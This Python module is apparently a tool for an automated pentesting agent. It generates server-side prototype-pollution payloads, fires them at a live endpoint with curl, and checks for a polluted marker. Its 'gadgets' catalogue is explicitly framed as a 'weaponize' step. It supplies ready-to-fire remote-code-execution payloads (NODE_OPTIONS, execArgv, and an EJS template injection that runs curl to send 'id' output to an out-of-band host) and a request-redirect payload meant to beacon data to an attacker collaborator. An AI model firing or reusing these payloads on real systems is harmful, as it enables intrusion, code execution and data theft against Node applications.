"""Prototype-pollution primitive — inject __proto__ / constructor.prototype gadgets and detect that a
property landed on the base Object prototype. A polluted prototype flips app-wide defaults (auth
checks, isAdmin, template options) and is a common Node/JS-backend RCE/authz primitive. This mints
the payloads in every carrier (JSON body, query string, form) and, when fired at an endpoint, looks
for the tell: a benign marker property that now appears where it shouldn't (server reflects it, or a
status/config endpoint gains the key) — proof the prototype was polluted, not just that input echoed.

Read-only-ish: the marker is a harmless unique key; do not pollute fields that break the app. Blind
cases (no reflection) confirm via a gadget that changes behavior — pair with a follow-up request.
"""
import base64
import json
import re


def payloads(marker: str = "pp_marker") -> list:
    """[(carrier, content-type-or-'query', body)] — the same pollution in each injection carrier."""
    j_proto = json.dumps({"__proto__": {marker: "polluted"}})
    j_ctor = json.dumps({"constructor": {"prototype": {marker: "polluted"}}})
    return [
        ("json __proto__", "application/json", j_proto),
        ("json constructor.prototype", "application/json", j_ctor),
        ("query __proto__", "query", f"__proto__[{marker}]=polluted"),
        ("query constructor", "query", f"constructor[prototype][{marker}]=polluted"),
        ("form __proto__", "application/x-www-form-urlencoded", f"__proto__[{marker}]=polluted"),
    ]


def gadgets(marker: str = "pp_marker", oob: str = "") -> list:
    """Known SERVER-SIDE prototype-pollution IMPACT gadgets — the detect->WEAPONIZE step. Once
    pollution is CONFIRMED, these turn "a property landed on Object.prototype" into real impact:
    exfil (inject a field onto every serialized object / redirect an outbound request to a
    collaborator), RCE (child_process env/argv, EJS template), or a status flip. Returned as
    ready-to-fire payloads — the RCE/exfil ones need a downstream trigger (a spawn / render / outbound
    request) and usually an OOB channel, so the agent fires them against the right sink. Returns
    [(name, what-it-does, content-type, body)]."""
    host = re.sub(r"^https?://", "", oob or "OOB_HOST").rstrip("/")
    P = lambda d: json.dumps({"__proto__": d})
    return [
        ("reflected-property injection (EXFIL/tamper)",
         "adds a property to EVERY serialized object; if data records/responses gain it you can inject "
         "or surface fields app-wide — the direct exfil-class tell",
         "application/json", P({marker: "INJECTED"})),
        ("outbound-request redirect (blind EXFIL)",
         f"pollute a host/url the app uses for a server-side request so data beacons to your collaborator "
         f"({host})",
         "application/json", P({"host": host})),
        ("RCE via child_process env (NODE_OPTIONS)",
         "if the app later spawns a Node child process, NODE_OPTIONS executes your file",
         "application/json", P({"NODE_OPTIONS": "--require /proc/self/environ"})),
        ("RCE via execArgv",
         "spawn/fork picks up polluted execArgv",
         "application/json", P({"execArgv": ["--eval=require('child_process').execSync('id')"]})),
        ("EJS template RCE (outputFunctionName)",
         "EJS render consumes outputFunctionName -> code injection on the next render",
         "application/json", P({"outputFunctionName": f"x;global.process.mainModule.require('child_process')"
                                f".execSync('curl http://{host}/$(id|base64)');//"})),
        ("status flip (impact demo)",
         "pollute status to change response codes app-wide",
         "application/json", P({"status": 510})),
    ]


def _gadget_menu(marker: str, oob: str = "") -> str:
    return ("\n\nESCALATION GADGETS (pollution is confirmed — now weaponize; fire the one matching the "
            "sink, RCE needs a downstream spawn/render + OOB):\n" +
            "\n".join(f"  - {n}: {w}\n      [{ct}] {b}" for n, w, ct, b in gadgets(marker, oob)))


def analyze(response_text: str, marker: str = "pp_marker") -> tuple:
    """The marker appearing in a response to a DIFFERENT/subsequent request (or a config/echo that
    shows an unexpected inherited key) is the pollution tell. Returns (polluted, summary)."""
    txt = response_text or ""
    # marker present as a *value-bearing* key (inherited onto an object it was never set on)
    hit = re.search(re.escape(marker) + r'"?\s*[:=]\s*"?polluted', txt, re.I)
    if hit:
        return True, (f"PROTOTYPE POLLUTION CONFIRMED — the marker '{marker}' appears on a response "
                      "object it was never set on (inherited from Object.prototype). Find the gadget "
                      "it enables (isAdmin/auth default, template RCE) and prove impact.")
    if re.search(r"proto|prototype", txt, re.I) and marker in txt:
        return False, (f"marker echoed near a prototype reference but not confirmed inherited — probe a "
                       "SEPARATE object/endpoint after polluting to confirm it's global, not reflection.")
    return False, f"no pollution detected — marker '{marker}' did not surface on another object."


def run(sb, args: dict) -> str:
    marker = args.get("marker") or "pp_marker"
    oob = args.get("oob") or ""
    pls = payloads(marker)
    endpoint = args.get("url") or ""
    if not endpoint:
        body = "\n\n".join(f"# {name} ({ct})\n{p}" for name, ct, p in pls)
        return ("PROTOTYPE-POLLUTION PAYLOADS (inject into a JSON/merge/config sink; then read a "
                "SEPARATE object to confirm the key is inherited globally):\n\n" + body +
                _gadget_menu(marker, oob))
    headers = args.get("headers") if isinstance(args.get("headers"), str) else ""
    hdr = ""
    if headers and ":" in headers:
        for line in headers.replace("\\n", "\n").splitlines():
            if ":" in line:
                hdr += f" -H {line.strip()!r}"
    readback = args.get("readback_url") or endpoint
    lines = []
    for name, ct, p in pls:
        if ct == "query":
            sb.bash(f"curl -s -m 12{hdr} {endpoint + ('&' if '?' in endpoint else '?') + p!r} -o /dev/null",
                    timeout=30)
        else:
            b64 = base64.b64encode(p.encode()).decode()
            sb.bash(f"echo {b64} | base64 -d | curl -s -m 12 -X POST -H 'Content-Type: {ct}'{hdr} "
                    f"--data-binary @- {endpoint!r} -o /dev/null", timeout=30)
        # read a (separate) object to see if the marker is now globally inherited
        rb = sb.bash(f"curl -s -m 12{hdr} {readback!r}", timeout=30)
        polluted, msg = analyze(rb, marker)
        lines.append(f"[{name}] -> {'‼ ' if polluted else ''}{msg}")
        if polluted:
            return "PROTOTYPE POLLUTION probe:\n" + "\n".join(lines) + _gadget_menu(marker, oob)
    return "PROTOTYPE POLLUTION probe:\n" + "\n".join(lines)


def demo() -> None:
    pls = dict((n, p) for n, ct, p in payloads("mk"))
    assert '"__proto__"' in pls["json __proto__"] and '"mk"' in pls["json __proto__"]
    assert "constructor][prototype]" in pls["query constructor"] or "constructor" in pls["query constructor"]
    # confirmed: marker inherited onto a different object
    ok, msg = analyze('{"id":9,"role":"user","mk":"polluted"}', "mk")
    assert ok and "CONFIRMED" in msg, msg
    # just echoed near prototype, not confirmed
    _, m2 = analyze('{"error":"cannot set __proto__","mk":"reflected only here"}', "mk")
    # clean
    assert not analyze('{"id":9,"role":"user"}', "mk")[0]
    # escalation gadget catalog: exfil + RCE gadgets present, OOB host threaded through
    gs = gadgets("mk", "http://c.oob.net/")
    names = " ".join(n for n, *_ in gs)
    assert "EXFIL" in names and "RCE" in names, names
    assert all(g[2] == "application/json" and '"__proto__"' in g[3] for g in gs)
    assert "c.oob.net" in _gadget_menu("mk", "http://c.oob.net/")           # collaborator wired in
    assert "NODE_OPTIONS" in _gadget_menu("mk")                             # RCE gadget offered
    print("protopollute.py ok")


if __name__ == "__main__":
    demo()
